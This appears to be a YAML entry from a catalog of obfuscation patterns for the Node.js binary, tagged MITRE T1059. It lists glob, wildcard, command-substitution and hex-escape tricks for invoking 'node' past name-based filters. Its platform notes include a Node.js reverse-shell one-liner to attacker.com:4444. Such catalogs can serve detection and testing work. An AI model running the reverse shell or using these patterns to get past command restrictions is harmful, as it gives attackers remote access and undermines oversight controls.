---
Name: node
Description: "Node.js JavaScript runtime. Can execute arbitrary JavaScript, spawn reverse shells, and make network connections."
Platform: linux
BinaryPath:
  - /usr/bin/node
  - /usr/bin/nodejs
  - /usr/local/bin/node
Category: execution
MitreID: T1059
Patterns:
  - Pattern: "nod?"
    Wildcards: ["?"]
    Notes: "Single wildcard replaces 'e'"
  - Pattern: "n*e"
    Wildcards: ["*"]
    Notes: "Star matches 'od' — may match other n*e binaries"
  - Pattern: "no[d]e"
    Wildcards: ["[]"]
    Notes: "Character class around 'd'"
  - Pattern: "/usr/bin/nod?"
    Wildcards: ["?"]
    Notes: "Full path wildcard on last char"
  - Pattern: "/???/bin/node"
    Wildcards: ["?"]
    Notes: "Obfuscate /usr/ directory"
  - Pattern: "$(ls /usr/bin/nod?)"
    Wildcards: ["?"]
    Notes: "ls resolves glob to /usr/bin/node; command substitution executes it"
  - Pattern: "$'\\x6e\\x6f\\x64\\x65'"
    Wildcards: []
    Notes: "ANSI-C hex escapes expand to 'node'"
PlatformNotes: |
  Node.js reverse shell: `node -e 'require("child_process").exec("bash -i >& /dev/tcp/attacker.com/4444 0>&1")'`. The binary may be named `nodejs` on older Debian/Ubuntu systems — use `nod*` to cover both.
Resources:
  - https://attack.mitre.org/techniques/T1059/
  - https://nodejs.org/api/cli.html
---
